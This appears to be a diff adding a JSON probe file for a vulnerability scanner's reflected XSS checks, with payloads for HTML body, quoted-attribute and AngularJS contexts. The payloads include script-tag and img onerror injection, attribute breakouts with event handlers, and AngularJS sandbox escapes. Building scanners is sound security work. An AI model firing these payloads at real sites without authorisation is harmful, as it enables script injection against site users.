@@ -1,0 +1,116 @@
+{
+  "category": "xss",
+  "contexts": {
+    "html": {
+      "description": "Reflected XSS probes for HTML body context — tests raw tag injection and script execution",
+      "tech_match": [],
+      "param_match": ["search", "q", "query", "name", "title", "comment", "msg", "text", "input", "value", "keyword"],
+      "probes": [
+        {
+          "payload": "<{{marker}}>",
+          "description": "Bare tag injection to detect unescaped HTML reflection",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "medium",
+          "confidence_boost": 30,
+          "variables": {}
+        },
+        {
+          "payload": "<img src=x onerror={{marker}}>",
+          "description": "img onerror XSS probe to detect event handler injection in HTML context",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {}
+        },
+        {
+          "payload": "<script>{{marker}}</script>",
+          "description": "Script tag injection for classic reflected XSS",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        }
+      ]
+    },
+    "attribute": {
+      "description": "Reflected XSS probes targeting HTML attribute context — breaks out of quoted attributes to inject event handlers",
+      "tech_match": [],
+      "param_match": ["search", "q", "query", "name", "title", "comment", "msg", "text", "input", "value", "keyword"],
+      "probes": [
+        {
+          "payload": "\" onmouseover={{marker}} x=\"",
+          "description": "Attribute breakout via double quote with injected event handler",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "' onmouseover={{marker}} x='",
+          "description": "Attribute breakout via single quote with injected event handler",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "\" autofocus onfocus={{marker}} x=\"",
+          "description": "Autofocus onfocus attribute injection for no-interaction XSS",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {}
+        }
+      ]
+    },
+    "angular": {
+      "description": "AngularJS template injection probes — tests server-side or client-side Angular expression evaluation",
+      "tech_match": ["AngularJS"],
+      "param_match": ["search", "q", "query", "name", "title", "comment", "msg", "text", "input", "value", "keyword"],
+      "probes": [
+        {
+          "payload": "{{7*7}}",
+          "description": "Angular expression evaluation probe — 49 confirms SSTI or client-side template injection",
+          "matchers": [
+            {"type": "word", "words": ["49"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        },
+        {
+          "payload": "{{constructor.constructor('alert(1)')()}}",
+          "description": "Angular sandbox escape using constructor chain",
+          "matchers": [
+            {"type": "word", "words": ["function"], "condition": "or"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 75,
+          "variables": {}
+        },
+        {
+          "payload": "{{$on.constructor('alert(1)')()}}",
+          "description": "Alternative Angular sandbox escape via $on.constructor",
+          "matchers": [
+            {"type": "reflection", "check_variants": true}
+          ],
+          "severity": "critical",
+          "confidence_boost": 70,
+          "variables": {}
+        }
+      ]
+    }
+  }
+}
